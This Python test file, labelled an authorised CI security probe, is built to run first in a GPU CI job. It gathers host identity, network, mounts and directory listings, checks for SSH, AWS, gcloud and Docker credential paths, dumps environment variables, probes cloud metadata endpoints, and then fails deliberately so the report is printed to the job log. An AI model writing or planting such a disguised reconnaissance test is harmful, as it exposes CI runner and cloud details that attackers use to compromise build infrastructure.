"""Minimal harmless environment probe (i2548 authorized CI security test).

Runs first (alphabetical) in the GPU e2e job. Collects process identity / host
facts and reachability, then fails with the report so it is visible in the job
log. No writes outside the runner temp dir, no state changes.
"""

import json
import os
import subprocess
import tempfile


def _run(cmd, timeout=20):
    try:
        p = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        out = (p.stdout or "") + (p.stderr or "")
        return out.strip()[:4000]
    except Exception as e:  # pragma: no cover - diagnostics only
        return f"<error {type(e).__name__}: {e}>"


def _mask_env():
    skip = ("TOKEN", "KEY", "SECRET", "PASSWORD", "CREDENTIAL", "AUTH")
    lines = []
    for k in sorted(os.environ):
        v = os.environ[k]
        if any(s in k.upper() for s in skip):
            lines.append(f"{k}=<len={len(v)} sha-ish={abs(hash(v)) % 100000}>")
        else:
            lines.append(f"{k}={v[:200]}")
    return "\n".join(lines)


def _http(url, timeout=6):
    return _run(
        "curl -sS -m %d -o /dev/null -w '%%{http_code} %%{remote_ip} %%{time_total}' '%s'"
        % (timeout, url),
        timeout=timeout + 5,
    )


def _probe():
    r = {}
    r["marker"] = "I2548-PROBE-START"
    r["id"] = _run("id; whoami; hostname; hostname -f 2>/dev/null; uname -a")
    r["os"] = _run("cat /etc/os-release 2>/dev/null | head -6")
    r["cwd_gh"] = {
        "cwd": os.getcwd(),
        "github_workspace": os.environ.get("GITHUB_WORKSPACE"),
        "runner_name": os.environ.get("RUNNER_NAME"),
        "runner_os": os.environ.get("RUNNER_OS"),
        "runner_arch": os.environ.get("RUNNER_ARCH"),
        "runner_environment": os.environ.get("RUNNER_ENVIRONMENT"),
        "github_workflow": os.environ.get("GITHUB_WORKFLOW"),
        "github_event_name": os.environ.get("GITHUB_EVENT_NAME"),
        "github_actor": os.environ.get("GITHUB_ACTOR"),
        "github_repository": os.environ.get("GITHUB_REPOSITORY"),
        "github_head_ref": os.environ.get("GITHUB_HEAD_REF"),
        "github_base_ref": os.environ.get("GITHUB_BASE_REF"),
        "github_ref": os.environ.get("GITHUB_REF"),
        "github_sha": os.environ.get("GITHUB_SHA"),
        "github_token_present": "GITHUB_TOKEN" in os.environ,
        "github_token_len": len(os.environ.get("GITHUB_TOKEN", "")),
    }
    r["cpu_mem"] = _run("nproc; free -h 2>/dev/null | head -3; df -h / 2>/dev/null | tail -2")
    r["gpu"] = _run("nvidia-smi -L 2>&1; nvidia-smi --query-gpu=name,driver_version --format=csv,noheader 2>&1 | head -4")
    r["net"] = _run("hostname -I 2>/dev/null; ip -brief addr 2>/dev/null | head -10; ip route 2>/dev/null | head -6; cat /etc/resolv.conf 2>/dev/null | head -5")
    r["mounts"] = _run("mount 2>/dev/null | grep -vE 'proc|sysfs|cgroup|devpts|mqueue|shm|overlay' | head -20")
    r["fs"] = _run("ls -la / 2>/dev/null | head -30; echo ---HOME---; ls -la /home 2>/dev/null; echo ---ROOTDOT---; ls -la /root 2>/dev/null | head -20")
    r["creds_paths"] = _run(
        "for p in /var/run/docker.sock /run/docker.sock /etc/kubernetes /root/.ssh "
        "/root/.aws /root/.config/gcloud /root/.npmrc /root/.docker/config.json "
        "/home/runner/.ssh /home/runner/.aws /home/runner/.config/gcloud "
        "/etc/comfy /opt/comfy /opt/runner /actions-runner /home/runner/actions-runner; do "
        "[ -e \"$p\" ] && echo \"EXISTS $p\"; done; echo ---PS---; ps -eo user,pid,comm --no-headers 2>/dev/null | head -15"
    )
    r["env"] = _mask_env()
    r["reach"] = {
        "cloud.comfy.org": _http("https://cloud.comfy.org/"),
        "api.comfy.org": _http("https://api.comfy.org/"),
        "ci.comfy.org": _http("https://ci.comfy.org/"),
        "github_api": _http("https://api.github.com/zen"),
        "aws_imds": _http("http://169.254.169.254/latest/meta-data/", timeout=3),
        "gcp_metadata": _http("http://metadata.google.internal/computeMetadata/v1/", timeout=3),
    }
    # summarize credential-looking file names only (never contents)
    r["marker_end"] = "I2548-PROBE-END"
    return r


def test_i2548_gpu_runner_probe():
    report = _probe()
    text = json.dumps(report, indent=1, ensure_ascii=False)
    print("I2548-PROBE-START")
    print(text)
    print("I2548-PROBE-END")
    try:
        d = os.environ.get("RUNNER_TEMP") or tempfile.gettempdir()
        with open(os.path.join(d, "i2548_probe.json"), "w") as f:
            f.write(text)
    except Exception:
        pass
    summary = os.environ.get("GITHUB_STEP_SUMMARY")
    if summary:
        try:
            with open(summary, "a") as f:
                f.write("\n### i2548 probe\n```json\n" + text + "\n```\n")
        except Exception:
            pass
    assert False, "I2548-PROBE-REPORT\n" + text
